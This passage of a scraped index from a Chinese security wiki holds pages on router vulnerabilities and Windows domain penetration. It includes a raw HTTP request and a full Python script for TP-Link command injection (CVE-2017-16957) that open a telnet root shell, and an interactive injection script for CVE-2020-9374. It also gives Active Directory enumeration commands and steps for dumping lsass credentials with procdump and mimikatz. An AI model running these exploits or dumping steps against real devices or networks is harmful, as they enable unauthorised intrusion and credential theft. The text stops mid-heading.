BR270n，RB1732命令执行有个重置就是登陆路由器，可以进行信息的同步获取用户名和密码，而且又有很多路由器使用的还是其他用户名和密码，GR297，BRC76n则不需要进行登陆 参考链接 http://lab.xinruisec.com/2019/09/05/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 19:56:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/TP-Link/CVE-2017-16957.html":{"url":"iot/TP-Link/CVE-2017-16957.html","title":"（CVE-2017-16957）TP-Link 命令注入漏洞","keywords":"","body":"（CVE-2017-16957）TP-Link 命令注入漏洞 一、漏洞简介 TP-Link TL-WVR等都是中国普联（TP-LINK）公司的无线路由器产品。 多款TP-Link产品中存在命令注入漏洞。远程攻击者可通过向cgi-bin/luci发送face字段中带有shell元字符的admin/diagnostic命令利用该漏洞执行任意命令。 二、漏洞影响 TP-LINK TL-WVR TP-LINK TL-WVR300 v4 TP-LINK TL-WVR302 v2 TP-LINK TL-WVR450 TP-LINK TL-WVR450L TP-LINK TL-WVR450G v5 TP-LINK TL-WVR458 TP-LINK TL-WVR458L TP-LINK TL-WVR458P TP-LINK TL-WVR900G v3 TP-LINK TL-WVR1200L TP-LINK TL-WVR900L TP-LINK TL-WVR1300L TP-LINK TL-WVR1300G TP-LINK TL-WVR1750L TP-LINK TL-WVR2600L TP-LINK TL-WVR4300L TP-LINK TL-WAR450 TP-LINK TL-WAR302 TP-LINK TL-WAR2600L TP-LINK TL-WAR1750L TP-LINK TL-WAR1300L TP-LINK TL-WAR1200L TP-LINK TL-WAR900L TP-LINK TL-WAR458 TP-LINK TL-WAR450L TP-LINK TL-ER5510G v2 TP-LINK TL-ER5510G v3 TP-LINK TL-ER5520G v2 TP-LINK TL-ER5520G v3 TP-LINK TL-ER6120G v2 TP-LINK TL-ER6520G v2 TP-LINK TL-ER6520G v3 TP-LINK TL-ER3210G TP-LINK TL-ER7520G TP-LINK TL-ER6520G TP-LINK TL-ER6510G TP-LINK TL-ER6220G TP-LINK TL-ER6120G TP-LINK TL-ER6110G TP-LINK TL-ER5120G TP-LINK TL-ER5110G TP-LINK TL-ER3220G TP-LINK TL-R479P-AC TP-LINK TL-R478G+ TP-LINK TL-R478G TP-LINK TL-R478+ TP-LINK TL-R478 TP-LINK TL-R473GP-AC TP-LINK TL-R473P-AC TP-LINK TL-R473G TP-LINK TL-R473 TP-LINK TL-R4299G TP-LINK TL-R4239G TP-LINK TL-R4149G TP-LINK TL-R488 TP-LINK TL-R483 TP-LINK TL-R483G TP-LINK TL-R479GP-AC TP-LINK TL-R479GPE-AC 三、复现过程 POST /cgi-bin/luci/;stok=ea2178b4514da7ae227f4ec192536930/admin/diagnostic?form=diag HTTP/1.1 Host: 0-sec.org Content-Length: 370 Accept: application/json, text/javascript, */*; q=0.01 Origin: http://192.168.3.1 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Referer: http://192.168.3.1/webpages/index.html Accept-Encoding: gzip, deflate Cookie: sysauth=be9b6f2b4b9a76a8a658e108c6197f2c Connection: close data=%7B%22method%22%3A%22start%22%2C%22params%22%3A%7B%22type%22%3A%220%22%2C%22type_hidden%22%3A%220%22%2C%22ipaddr_ping%22%3A%22baidu.com%22%2C%22iface_ping%22%3A%22WAN1%22%2C%22ipaddr%22%3A%22baidu.com%22%2C%22iface%22%3A%22%3Btelnetd+-p+24+-l+/bin/sh%22%2C%22count%22%3A%221%22%2C%22pktsize%22%3A%2264%22%2C%22my_result%22%3A%22The+Router+is+ready.%5Cr%5Cn%22%7D%7D 漏洞脚本 # Tested product: TL-WVR450L # Hardware version：V1.0 # Firmware version: 20161125 # The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager. # You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js import execjs import requests import json import urllib def read_js(): file = open(\"./RSA_Encryption_For_Tplink.js\", 'r') line = file.readline() js = '' while line: js = js + line line = file.readline() file.close() return js def execute(ip, port, username, passwd, cmd): try: s = requests.session() uri = \"http://{}:{}\".format(ip,port) headers = { 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://{}/webpages/login.html'.format(ip) } payload = { \"method\":\"get\" } ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({\"data\":json.dumps(payload)}), headers=headers, timeout=5) rsa_public_n = json.loads(ret.text)['result']['password'][0].encode(\"utf-8\") rsa_public_e = json.loads(ret.text)['result']['password'][1].encode(\"utf-8\") js = read_js() js_handle = execjs.compile(js) password = js_handle.call('MainEncrypt', rsa_public_n, rsa_public_e, passwd) payload = { \"method\":\"login\", \"params\":{ \"username\":\"{}\".format(username), \"password\":\"{}\".format(password) } } ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({\"data\":json.dumps(payload)}), headers=headers, timeout=5) stok = json.loads(ret.text)['result']['stok'].encode('utf-8') cookie = ret.headers['Set-Cookie'] print '[+] Login success' print '[+] Get The Token: ' + stok print '[+] Get The Cookie: ' + cookie headers = { 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 'Referer':'http://{}/webpages/login.html'.format(ip), 'Cookie':'{}'.format(cookie) } payload = { \"method\":\"start\", \"params\":{ \"type\":\"0\", \"type_hidden\":\"0\", \"ipaddr_ping\":\"127.0.0.1\", \"iface_ping\":\"WAN1\", \"ipaddr\":\"127.0.0.1\", \"iface\":\";{}\".format(cmd), \"count\":\"1\", \"pktsize\":\"64\", \"my_result\":\"exploit\" } } ret = s.post(uri + '/cgi-bin/luci/;stok={}/admin/diagnostic?form=diag'.format(stok), data=urllib.urlencode({\"data\":json.dumps(payload)}), headers=headers, timeout=5) #print ret.text print '[+] Finish RCE' print '--------------------------------------------------------------' return True except: return False if __name__=='__main__': print '-----------Tplink LUCI diagnostic Authenticated RCE-----------' print execute('192.168.1.1', 80, 'admin', 'admin', 'telnetd -p 24 -l /bin/sh') RSA_Encryption_For_Tplink.js 文件 // Copyright (c) 2005 Tom Wu // All Rights Reserved. // See \"LICENSE\" for details. // Basic JavaScript BN library - subset useful for RSA encryption. // Bits per digit // JavaScript engine analysis var BI_RC = new Array(); var BI_RM = \"0123456789abcdefghijklmnopqrstuvwxyz\"; var dbits; var canary = 0xdeadbeefcafe; var j_lm = ((canary&0xffffff)==0xefcafe); var rng_psize = 256; var rng_state; var rng_pool; var rng_pptr; // Initialize the pool with junk if needed. BigInteger.prototype.am = am2; dbits = 30; BigInteger.prototype.DB = dbits; BigInteger.prototype.DM = ((1= 0) { var v = x*this[i++]+w[j]+c; c = Math.floor(v/0x4000000); w[j++] = v&0x3ffffff; } return c; } // am2 avoids a big mult-and-extract completely. // Max digit bits should be >15; while(--n >= 0) { var l = this[i]&0x7fff; var h = this[i++]>>15; var m = xh*l+h*xl; l = xl*l+((m&0x7fff)>>30)+(m>>>15)+xh*h+(c>>>30); w[j++] = l&0x3fffffff; } return c; } // Alternately, set max digit bits to 28 since some // browsers slow down when dealing with 32-bit numbers. function am3(i,x,w,j,c,n) { var xl = x&0x3fff, xh = x>>14; while(--n >= 0) { var l = this[i]&0x3fff; var h = this[i++]>>14; var m = xh*l+h*xl; l = xl*l+((m&0x3fff)>28)+(m>>14)+xh*h; w[j++] = l&0xfffffff; } return c; } function int2char(n) { return BI_RM.charAt(n); } function intAt(s,i) { var c = BI_RC[s.charCodeAt(i)]; return (c==null)?-1:c; } // (protected) copy this to r function bnpCopyTo(r) { for(var i = this.t-1; i >= 0; --i) r[i] = this[i]; r.t = this.t; r.s = this.s; } // (protected) set from integer value x, -DV 0) this[0] = x; else if(x = 0) { var x = (k==8)?s[i]&0xff:intAt(s,i); if(x this.DB) { this[this.t-1] |= (x&((1>(this.DB-sh)); } else this[this.t-1] |= x= this.DB) sh -= this.DB; } if(k == 8 && (s[0]&0x80) != 0) { this.s = -1; if(sh > 0) this[this.t-1] |= ((1 0 && this[this.t-1] == c) --this.t; } // (public) return string representation in given radix function bnToString(b) { if(this.s 0) { if(p >p) > 0) { m = true; r = int2char(d); } while(i >= 0) { if(p >(p+=this.DB-k); } else { d = (this[i]>>(p-=k))&km; if(p 0) m = true; if(m) r += int2char(d); } } return m?r:\"0\"; } // (public) -this function bnNegate() { var r = nbi(); BigInteger.ZERO.subTo(this,r); return r; } // (public) |this| function bnAbs() { return (this.s a, - if this = 0) if((r=this[i]-a[i]) != 0) return r; return 0; } // returns bit length of the integer x function nbits(x) { var r = 1, t; if((t=x>>>16) != 0) { x = t; r += 16; } if((t=x>>8) != 0) { x = t; r += 8; } if((t=x>>4) != 0) { x = t; r += 4; } if((t=x>>2) != 0) { x = t; r += 2; } if((t=x>>1) != 0) { x = t; r += 1; } return r; } // (public) return the number of bits in \"this\" function bnBitLength() { if(this.t = 0; --i) r[i+n] = this[i]; for(i = n-1; i >= 0; --i) r[i] = 0; r.t = this.t+n; r.s = this.s; } // (protected) r = this >> n*DB function bnpDRShiftTo(n,r) { for(var i = n; i = 0; --i) { r[i+ds+1] = (this[i]>>cbs)|c; c = (this[i]&bm)= 0; --i) r[i] = 0; r[ds] = c; r.t = this.t+ds+1; r.s = this.s; r.clamp(); } // (protected) r = this >> n function bnpRShiftTo(n,r) { r.s = this.s; var ds = Math.floor(n/this.DB); if(ds >= this.t) { r.t = 0; return; } var bs = n%this.DB; var cbs = this.DB-bs; var bm = (1>bs; for(var i = ds+1; i >bs; } if(bs > 0) r[this.t-ds-1] |= (this.s&bm)>= this.DB; } if(a.t >= this.DB; } c += this.s; } else { c += this.s; while(i >= this.DB; } c -= a.s; } r.s = (c 0) r[i++] = c; r.t = i; r.clamp(); } // (protected) r = this * a, r != this,a (HAC 14.12) // \"this\" should be the larger one if appropriate. function bnpMultiplyTo(a,r) { var x = this.abs(), y = a.abs(); var i = x.t; r.t = i+y.t; while(--i >= 0) r[i] = 0; for(i = 0; i = 0) r[i] = 0; for(i = 0; i = x.DV) { r[i+x.t] -= x.DV; r[i+x.t+1] = 1; } } if(r.t > 0) r[r.t-1] += x.am(i,x[i],r,2*i,0,1); r.s = 0; r.clamp(); } // (protected) divide this by m, quotient and remainder to q, r (HAC 14.20) // r != q, this != m. q or r may be null. function bnpDivRemTo(m,q,r) { var pm = m.abs(); if(pm.t 0) { pm.lShiftTo(nsh,y); pt.lShiftTo(nsh,r); } else { pm.copyTo(y); pt.copyTo(r); } var ys = y.t; var y0 = y[ys-1]; if(y0 == 0) return; var yt = y0*(11)?y[ys-2]>>this.F2:0); var d1 = this.FV/yt, d2 = (1= 0) { r[r.t++] = 1; r.subTo(t,r); } BigInteger.ONE.dlShiftTo(ys,t); t.subTo(y,y); // \"negative\" y so we can replace sub with am later while(y.t = 0) { // Estimate quotient digit var qd = (r[--i]==y0)?this.DM:Math.floor(r[i]*d1+(r[i-1]+e)*d2); if((r[i]+=y.am(0,qd,r,j,0,ys)) 0) r.rShiftTo(nsh,r); // Denormalize remainder if(ts 0) a.subTo(r,r); return r; } // Modular reduction using \"classic\" algorithm function Classic(m) { this.m = m; } function cConvert(x) { if(x.s = 0) return x.mod(this.m); else return x; } function cRevert(x) { return x; } function cReduce(x) { x.divRemTo(this.m,null,x); } function cMulTo(x,y,r) { x.multiplyTo(y,r); this.reduce(r); } function cSqrTo(x,r) { x.squareTo(r); this.reduce(r); } // (protected) return \"-1/this % 2^DB\"; useful for Mont. reduction // justification: // xy == 1 (mod m) // xy = 1+km // xy(2-xy) = (1+km)(1-km) // x[y(2-xy)] = 1-k^2m^2 // x[y(2-xy)] == 1 (mod m^2) // if y is 1/x mod m, then y(2-xy) is 1/x mod m^2 // should reduce x and y(2-xy) by m^2 at each step to keep size bounded. // JS multiply \"overflows\" differently from C/C++, so care is needed here. function bnpInvDigit() { if(this.t 0)?this.DV-y:-y; } // Montgomery reduction function Montgomery(m) { this.m = m; this.mp = m.invDigit(); this.mpl = this.mp&0x7fff; this.mph = this.mp>>15; this.um = (1 0) this.m.subTo(r,r); return r; } // x/R mod m function montRevert(x) { var r = nbi(); x.copyTo(r); this.reduce(r); return r; } // x = x/R mod m (HAC 14.32) function montReduce(x) { while(x.t >15)*this.mpl)&this.um)= x.DV) { x[j] -= x.DV; x[++j]++; } } x.clamp(); x.drShiftTo(this.m.t,x); if(x.compareTo(this.m) >= 0) x.subTo(this.m,x); } // r = \"x^2/R mod m\"; x != r function montSqrTo(x,r) { x.squareTo(r); this.reduce(r); } // r = \"xy/R mod m\"; x,y != r function montMulTo(x,y,r) { x.multiplyTo(y,r); this.reduce(r); } // (protected) true iff this is even function bnpIsEven() { return ((this.t>0)?(this[0]&1):this.s) == 0; } // (protected) this^e, e 0xffffffff || e = 0) { z.sqrTo(r,r2); if((e&(1 0) z.mulTo(r2,g,r); else { var t = r; r = r2; r2 = t; } } return z.revert(r); } // (public) this^e % m, 0 > 8) & 255; rng_pool[rng_pptr++] ^= (x >> 16) & 255; rng_pool[rng_pptr++] ^= (x >> 24) & 255; if(rng_pptr >= rng_psize) rng_pptr -= rng_psize; } // Mix in the current time (w/milliseconds) into the pool function rng_seed_time() { rng_seed_int(new Date().getTime()); } function rng_get_byte() { if(rng_state == null) { rng_seed_time(); rng_state = prng_newstate(); rng_state.init(rng_pool); for(rng_pptr = 0; rng_pptr = 0 && n > 0) { var c = s.charCodeAt(i--); if(c 127) && (c > 6) | 192; } else { ba[--n] = (c & 63) | 128; ba[--n] = ((c >> 6) & 63) | 128; ba[--n] = (c >> 12) | 224; } } ba[--n] = 0; var rng = new SecureRandom(); var x = new Array(); while(n > 2) { // random non-zero pad x[0] = 0; while(x[0] == 0) rng.nextBytes(x); ba[--n] = x[0]; } ba[--n] = 2; ba[--n] = 0; return new BigInteger(ba); } function nopadding(s,n) { if(n 127) && (c > 6) | 192; }else{ ba[j++] = (c & 63) | 128; ba[j++] = ((c >> 6) & 63) | 128; ba[j++] = (c >> 12) | 224; } }; while (j 0 && E.length > 0) { this.n = parseBigInt(N,16); this.e = parseInt(E,16); } else alert(\"Invalid RSA public key\"); } // Perform raw public operation on \"x\": return x^e (mod n) function RSADoPublic(x) { return x.modPowInt(this.e, this.n); } // Return the PKCS#1 RSA encryption of \"text\" as an even-length hex string function RSAEncrypt(text) { var m = nopadding(text,(this.n.bitLength()+7)>>3); if(m == null) return null; var c = this.doPublic(m); if(c == null) return null; var h = c.toString(16); if((h.length & 1) == 0) return h; else return \"0\" + h; } function MainEncrypt(n,e,message) { RSAKey.prototype.doPublic = RSADoPublic; RSAKey.prototype.setPublic = RSASetPublic; RSAKey.prototype.encrypt = RSAEncrypt; var rsa = new RSAKey(); rsa.setPublic(n,e); var passwd = rsa.encrypt(message); return passwd; } 四、参考链接 https://www.03sec.com/3207.shtml 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 19:24:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/TP-Link/CVE-2020-9374.html":{"url":"iot/TP-Link/CVE-2020-9374.html","title":"（CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞","keywords":"","body":"（CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞 一、漏洞简介 在TP-Link TL-WR849N 0.9.1 4.16设备上，当攻击者将特定的外壳元字符发送到面板的traceroute功能时，可以利用诊断区域中的远程命令执行漏洞。 二、漏洞影响 TP-Link TL-WR849N 0.9.1 4.16 三、复现过程 # Exploit Title: TP LINK TL-WR849N - Remote Code Execution # Date: 2019-11-20 # Exploit Author: Elber Tavares # Vendor Homepage: https://www.tp-link.com/ # Software Link: https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware # Version: TL-WR849N 0.9.1 4.16 # Tested on: linux, windows # CVE : CVE-2020-9374 import requests def output(headers,cookies): url = 'http://192.168.0.1/cgi?1' data = '' data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\x0d\\x0a' data += 'diagnosticsState\\x0d\\x0a' data += 'X_TP_HopSeq\\x0d\\x0a' data += 'X_TP_Result\\x0d\\x0a' r = requests.post(url,data=data,headers=headers,cookies=cookies) saida = r.text filtro = saida.replace(': Name or service not known','') filtro = filtro.replace('[0,0,0,0,0,0]0','') filtro = filtro.replace('diagnosticsState=','') filtro = filtro.replace('X_TP_HopSeq=0','') filtro = filtro.replace('X_TP_Result=','') print(filtro[:-8]) def aceppt(headers,cookies): url = 'http://192.168.0.1/cgi?7' data = '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\\x0d\\x0a' r = requests.post(url,data=data,headers=headers,cookies=cookies) output(headers,cookies) def inject(command,headers,cookies): url = 'http://192.168.0.1/cgi?2' data = '' data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\\x0d\\x0a' data += 'maxHopCount=20\\x0d\\x0a' data += 'timeout=5\\x0d\\x0a' data += 'numberOfTries=1\\x0d\\x0a' data += 'host=\\\"$('+command+')\\\"\\x0d\\x0a' data += 'dataBlockSize=64\\x0d\\x0a' data += 'X_TP_ConnName=ewan_pppoe\\x0d\\x0a' data += 'diagnosticsState=Requested\\x0d\\x0a' data += 'X_TP_HopSeq=0\\x0d\\x0a' r = requests.post(url,data=data,headers=headers,cookies=cookies) aceppt(headers,cookies) def main(): cookies = {\"Authorization\": \"Basic REPLACEBASE64AUTH\"} headers = {'Content-Type': 'text/plain', 'Referer': 'http://192.168.0.1/mainFrame.htm'} while True: command = input('$ ') inject(command,headers,cookies) main() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-04 13:01:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/1.html":{"url":"域渗透/1.html","title":"1.1 域的简单介绍","keywords":"","body":"1、域的简单介绍 将网络中多台计算机逻辑上组织到一起进行集中管理，这种区别于工作组的逻辑环境叫 做域。域是由域控制器(Domain Controller)和成员计算机组成，域控制器就是安装了活动 目录(Active Directory)的计算机。活动目录提供了存储网络上对象信息并使用网络使用该 数据的方法。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 16:46:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/1.1.html":{"url":"域渗透/1.1.html","title":"1.2 域优缺点","keywords":"","body":"1.1 工作组的缺点 没有统一的管理机制， 没有对用户账户的统一的身份验证机制  没有统一查找网络资源的机制 1.2 域优势 活动目录的特点: 集中管理，可以集中的管理企业中成千上万分布于异地的计算机和用户。 便捷的网络资源访问，能够容易的定位到域中的资源。 用户一次登录就可访问整个网络资源，集中的身份验证。 网络资源主要包含用户帐户、组、共享文件夹、打印机等 可扩展性，既可以适用于几十台计算机的小规模网络，也可以适用于跨国公司。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 16:46:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/2.html":{"url":"域渗透/2.html","title":"2.1 Kerberos 协议介绍","keywords":"","body":"2、Kerberos 协议简介 Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 16:50:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/2.1.html":{"url":"域渗透/2.1.html","title":"2.2 Kerberos 协议框架","keywords":"","body":"2.1 Kerberos 协议框架 Kerberos 协议中主要有三个角色: 访问服务的 Client 提供服务的 Server KDC(Key Distribution Center)密钥分发中心 KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数 据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。 如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。 由上图可以看出，KDC 又分为两个部分: Authentication Server: AS 的作用就是验证 Client 的身份(确认你是身份证上的本人)， 验证通过就给一张 TGT(Ticket Granting Ticket)票给 Client。 Ticket Granting Server: TGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server 端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 16:50:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/2.2.html":{"url":"域渗透/2.2.html","title":"2.3 Kerberos 认证流程","keywords":"","body":"2.2 Kerberos 认证流程 当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块: The Authentication Service Exchange: Client 与 AS 的交互 The Ticket Granting Service Exchange:Client 与 TGS 的交互 The Client/Server Authentication Exchange:Client 与 Server 的交互 (1) The Authentication Service Exchange KRB_AS_REQ: Client->AS:发送 Authenticator1(Client 密码加密 TimeStamp) 第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。 KBR_AS_REP: AS->Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp) 在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。 (2) The Ticket Granting Service(TGS) Exchange KBR_TGS_REQ: Client->TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp) Client 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。 KBR_TGS-REP: TGS->Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs) TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。 (3) The Client/Server Authentication Exchange KBR_AP_REQ: Client->Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs) Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。 KBR_AP_REP: Server->Client : Server 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 16:50:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/3.1.html":{"url":"域渗透/3.1.html","title":"3.1 判断是否是域环境","keywords":"","body":"3.1 判断是否是域环境 命令汇总 net view /domain 查询域列表 net time/domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务器 net localgroup administrators 本机管理员【通常含有域用户】 net user /domain 查询域用户(当前域) net group /domain 查询域工作组 net group \"domain computers\" /domain 查看加入域的所有计算机名 net group \"domain admins\" /domain 查询域管理员用户组和域管用户 net localgroup administrators /domain 查看域管理员 net group \"domain controllers\" /domain 查看域控 net accounts /domain 查看域密码策略 命令截图 net view /domain 查询域列表 net time/domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务器 net localgroup administrators 本机管理员【通常含有域用户】 net user /domain 查询域用户(当前域) net group /domain 查询域工作组 net group \"domain computers\" /domain 查看加入域的所有计算机名 net group \"domain admins\" /domain 查询域管理员用户组和域管用户 net localgroup administrators /domain 查看域管理员 net group \"domain controllers\" /domain 查看域控 net accounts /domain 查看域密码策略 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 17:08:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/3.2.html":{"url":"域渗透/3.2.html","title":"3.2 定位域控","keywords":"","body":"3.2 定位域控 1、通常域内主机 DNS 地址就是域控地址 2、查看是否开启 53，389 等端口 3、ping 域控计算机名 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-26 16:14:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/3.3.html":{"url":"域渗透/3.3.html","title":"3.3 非域信息收集","keywords":"","body":"3.3 非域信息收集 1、盲扫 C 端、B 段等 2、查看 arp 表、路由表 3、找配置文件，如数据库配置等 3、找配置文件，如数据库配置等 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 17:14:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.1.1.html":{"url":"域渗透/4.1.1.html","title":"4.1.1 mimikatz","keywords":"","body":"4.1.1 mimikatz 用法: mimikatz # privilege::debug (提升权限) Privilege '20' OK mimikatz # sekurlsa::logonpasswords (抓取明文密码和 hash) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 17:19:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.1.2.html":{"url":"域渗透/4.1.2.html","title":"4.1.2 procdump+mimikatz","keywords":"","body":"4.1.2 procdump+mimikatz Procdump 是微软官方发布的一款调试工具，因此不会被各种杀毒软件查杀。可使用 procdump 加 mimikatz 来躲避杀软检测。 官方下载地址:https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump 1、使用 procdump 将目标的 lsass.exe 转储成 dmp 文件 procdump64.exe -accepteula -ma lsass.exe lsass.dmp 2、使用 mimikatz 从转储的 lsass.dmp 中来读取明文密码 mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 17:21:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.1.3.html":{"url":"域渗透/4.1.3.html","title":"4.1.3 LaZagne","keywords":"","body":"4.1.3 LaZagne 一款抓密码的神器，可以抓取系统密码、浏览器密码、wifi 密码等等。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 17:48:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.1.1.html":{"url":"域渗透/4.2.1.1.html","title":"4.2.1.1 IPC 利用条件","keywords":"","body":"4.2.1.1 IPC 利用条件 1、139 或 445 端口开启:ipc 连接可以实现远程登录及对默认共享的访问;而 139 端口 的开启表示 netbios 协议的应用，我们可以通过 139、445 端口实现对共享文件/打印机的访 问 2、管理员开启了默认共享:默认共享是为了方便管理员远程管理而默认开启的共享， 即所有的逻辑盘(C$、d$、e$...)和系统目录 winnt 或者 windows(admin$) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:04:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.1.2.html":{"url":"域渗透/4.2.1.2.html","title":"4.2.1.2 建立 IPC 连接、copy 